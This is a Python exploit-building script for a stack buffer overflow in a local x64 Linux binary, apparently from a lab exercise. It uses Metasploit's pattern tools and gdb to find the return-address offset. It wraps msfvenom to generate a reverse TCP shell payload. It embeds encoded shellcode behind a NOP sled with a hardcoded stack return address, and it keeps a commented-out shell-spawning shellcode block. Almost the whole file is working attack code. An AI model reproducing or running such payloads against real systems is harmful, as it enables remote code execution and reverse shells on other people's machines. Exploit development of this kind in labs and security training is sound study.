from subprocess import *
import re
import struct


def get_offset(name):
	p=run(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l','500'], stdout=PIPE)
	f=open('pattern_input.txt','wb')
	f.write(p.stdout)
	f.close()

	reg= re.compile('EIP[\S ]+',re.IGNORECASE)
	reg2 = re.compile('\'[a-z0-9]+\'',re.IGNORECASE)
	p=run(["gdb", "-batch", "-x", "./gdb_script", "--args", name], stdout=PIPE)
	t=p.stdout
	t=t.decode("utf-8")
	t=reg.findall(t)[1]

	t=reg2.findall(t)[0][1:-1]

	p=run(['/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb', '-q',t], stdout=PIPE)
	t= p.stdout.decode("utf-8")

	print('Offset is: ', t)

	offset = int(t.split(' ')[-1])
	return offset



def get_shellcode_linux(host,port):
	p = run(['msfvenom', '-a', 'x64', '--platform', 'linux', '-p', 'linux/x64/shell_reverse_tcp', 'LHOST='+host, 'LPORT='+port, '-b', '\'\\x00\'', '-f', 'python'], stdout=PIPE)
	t = p.stdout.decode("utf-8")
	t = t.split('buf =')[1]
	t = t.split('buf +=')[1:]
	t = "".join(t)
	t = t.split('\n')
	t = "".join(t)
	t = t.split('"')
	t = "".join(t)
	t = t.split(' ')
	t = "".join(t)
	print(t)
	t = t.encode("utf-8")
	return t.decode('unicode_escape')

# rbp 8An9Ao0A

# rip 6f41316f

#get_shellcode_linux('10.0.2.15','443')
offset =424 # get_offset('vuln1_x64_vanilla')

buf = b""
buf += b'\x90'*240
#buf += b"\x66\x81\xEC\x98\x01"
buf += b"\x48\x8D\x05\xC8\xFE\xFF\xFF\x48\x89\xC5"
buf +=  b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xdc\x7f\xdd\xe2\x79\x89\x16\x24\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb6\x56\x85\x7b\x13\x8b\x49\x4e\xdd\x21\xd2\xe7\x31\x1e\x5e\x9d\xde\x7f\xdc\x59\x73\x89\x14\x2b\x8d\x37\x54\x04\x13\x99\x4c\x4e\xf6\x27\xd2\xe7\x13\x8a\x48\x6c\x23\xb1\xb7\xc3\x21\x86\x13\x51\x2a\x15\xe6\xba\xe0\xc1\xad\x0b\xbe\x16\xb3\xcd\x0a\xe1\x16\x77\x94\xf6\x3a\xb0\x2e\xc1\x9f\xc2\xd3\x7a\xdd\xe2\x79\x89\x16\x24"

print(len(buf))
# exec /bin/bash
"""
buf =  b""
buf+= b"\x90"*50

buf += b"\x33\xc9\x83\xe9\xf4\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x41\x60\x94\xa9\x83\xee\xfc\xe2\xf4\x2b\x6b"
buf += b"\xcc\x30\x13\x06\xfc\x84\x22\xe9\x73\xc1\x6e\x13\xfc"
buf += b"\xa9\x29\x4f\xf6\xc0\x2f\xe9\x77\xfb\xa9\x6a\x94\xa9"
buf += b"\x41\x4f\xf6\xc0\x2f\x4f\xf6\xc8\x32\x08\x94\xfe\x12"
buf += b"\xe9\x75\x64\xc1\x60\x94\xa9"
"""

eip_num = 0x7fffffffe2a8
ebp_num = eip_num-0x138

#ebp = struct.pack("<Q", ebp_num)
eip = struct.pack("<Q", eip_num)

print(offset-len(buf))
buf+= b"\x90"*(offset-len(buf))

print(len(buf))

#buf+=ebp
buf+=eip

print(len(buf))

f=open('exploit_x64_vanilla_linux.txt','wb')

f.write(buf)
f.close()

#p=run(['./vuln1_x86_vanilla'], stdout=PIPE)

#sh.write(buf)

#sh.communicate()

#print()